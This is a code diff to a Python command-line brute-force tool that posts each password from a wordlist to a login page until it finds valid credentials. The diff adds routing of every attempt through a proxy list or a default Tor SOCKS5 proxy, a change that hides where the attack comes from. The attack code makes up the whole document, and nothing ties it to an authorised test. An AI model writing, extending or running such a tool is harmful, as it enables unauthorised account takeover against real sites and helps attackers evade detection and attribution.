@@ -20,8 +20,25 @@ def is_valid_url(url):
     except ValueError:
         return False
 
+# Function to read proxy from file or use default Tor proxy
+def get_proxies(proxy_file=None):
+    if proxy_file:
+        try:
+            with open(proxy_file, 'r') as file:
+                proxies = [line.strip() for line in file]
+            return {'http': proxies[0], 'https': proxies[0]}
+        except FileNotFoundError:
+            print("Error: Proxy list file not found.")
+            sys.exit(1)
+        except IndexError:
+            print("Error: Proxy list file is empty.")
+            sys.exit(1)
+    else:
+        # Default to Tor proxy
+        return {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+
 # Function to perform brute force
-def brute_force_login(url, username, password_list):
+def brute_force_login(url, username, password_list, proxies):
     print("Starting brute force attack...\n")
     try:
         with open(password_list, 'r') as file:
@@ -32,7 +49,7 @@ def brute_force_login(url, username, password_list):
                     'password': password
                 }
                 try:
-                    response = requests.post(url, data=data, timeout=5)
+                    response = requests.post(url, data=data, proxies=proxies)
                     if response.status_code == 200 and "Login successful" in response.text:
                         print(f"[+] Found valid credentials: {username}:{password}")
                         return
@@ -51,6 +68,7 @@ def main():
     parser.add_argument('-u', '--url', required=True, help="URL of the login page.")
     parser.add_argument('-U', '--username', required=True, help="Username for login.")
     parser.add_argument('-P', '--password-list', required=True, help="Path to the password list file.")
+    parser.add_argument('-p', '--proxy-file', help="Path to the proxy list file (optional).")
 
     args = parser.parse_args()
 
@@ -61,8 +79,11 @@ def main():
 
     username = args.username
     password_list = args.password_list
+    proxy_file = args.proxy_file
 
-    brute_force_login(url, username, password_list)
+    proxies = get_proxies(proxy_file)
+    
+    brute_force_login(url, username, password_list, proxies)
 
 if __name__ == "__main__":
     show_banner()
